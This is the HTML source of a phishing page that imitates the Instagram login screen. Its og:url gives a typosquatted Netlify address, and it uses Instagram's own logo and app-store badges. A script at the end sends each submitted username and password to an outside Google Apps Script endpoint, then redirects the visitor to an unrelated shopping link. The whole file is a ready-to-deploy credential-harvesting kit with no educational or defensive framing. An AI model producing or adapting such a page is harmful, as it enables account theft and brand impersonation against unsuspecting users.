<!DOCTYPE html>
<html lang="en">
<head>
     <meta property="og:title" content="Instagram Login">
    <meta property="og:description" content="Log in to continue.">
    <meta property="og:image" content="https://m.media-amazon.com/images/I/716pQIm90aL._SX679_.jpg">
    <meta property="og:url" content="https://instragramlogn.netlify.app/">
    <meta name="twitter:card" content="summary_large_image">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .instagram-gradient {
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .input-field:focus {
            border-color: #a8a8a8 !important;
            box-shadow: none !important;
        }
        .login-btn:active {
            opacity: 0.7;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .form-container {
            max-width: 350px;
            width: 100%;
        }
        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #8e8e8e;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="form-container space-y-3">
        <!-- âœ… Single Form Tag -->
        <form class="bg-white p-8 rounded border border-gray-200" id="gform" method="POST" action="">
            <div class="flex justify-center mb-8">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
                     alt="Instagram Logo" 
                     class="h-10">
            </div>
            
            <!-- Username -->
            <div class="mb-3 relative">
                <input type="text" 
                       name="username" 
                       class="input-field w-full px-3 py-2 border border-gray-300 rounded text-sm text-gray-700 focus:outline-none" 
                       placeholder="Phone number, username, or email" 
                       required>
            </div>
            
            <!-- Password -->
            <div class="mb-4 relative">
                <input type="password" 
                       name="password" 
                       id="password"
                       class="input-field w-full px-3 py-2 border border-gray-300 rounded text-sm text-gray-700 focus:outline-none" 
                       placeholder="Password" 
                       required>
            </div>
            
            <!-- Login Button -->
            <button type="submit" class="login-btn w-full py-1 px-4 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded text-sm focus:outline-none transition mb-4">
                Log In
            </button>
            
            <!-- Divider -->
            <div class="flex items-center divider my-4">
                <span class="px-4 text-xs font-semibold text-gray-400">OR</span>
            </div>
            
            <!-- Facebook Login -->
            <div class="text-center mb-4">
                <a href="#" class="flex items-center justify-center space-x-2 text-blue-800 font-medium text-sm">
                    <i class="fab fa-facebook-square text-lg"></i>
                    <span>Log in with Facebook</span>
                </a>
            </div>
            
            <!-- Forgot Password -->
            <div class="text-center">
                <a href="#" class="text-xs text-blue-900 hover:underline">Forgot password?</a>
            </div>
        </form>
        
        <!-- Sign Up -->
        <div class="bg-white p-4 rounded border border-gray-200 text-center">
            <p class="text-sm">
                Don't have an account? 
                <a href="#" class="text-blue-500 font-medium hover:underline">Sign up</a>
            </p>
        </div>
        
        <!-- App Download Links -->
        <div class="text-center space-y-4">
            <p class="text-sm">Get the app.</p>
            <div class="flex justify-center space-x-2">
                <a href="#" class="w-1/2">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" 
                         alt="Download on App Store" 
                         class="h-10 mx-auto">
                </a>
                <a href="#" class="w-1/2">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" 
                         alt="Get it on Google Play" 
                         class="h-10 mx-auto">
                </a>
            </div>
        </div>
    </div>
  <script>
$("#gform").submit((e)=>{
    e.preventDefault();
    $.ajax({
        url:"https://script.google.com/macros/s/AKfycbwfiDtQHpyvQ2t4Clh-cWtlQiLEdnjen4o8S2VDVchHG0uAT3h2clWatMtUBm31ytdgfQ/exec",
        data:$("#gform").serialize(),
        method:"POST",
        success:function (){
            window.location.href = "https://dl.flipkart.com/s/DHgs4EuuuN";
        },
        error:function (){
            window.location.href = "https://dl.flipkart.com/s/DHgs4EuuuN"; 
        }
    });
});
</script>

    
   
</body>
</html>
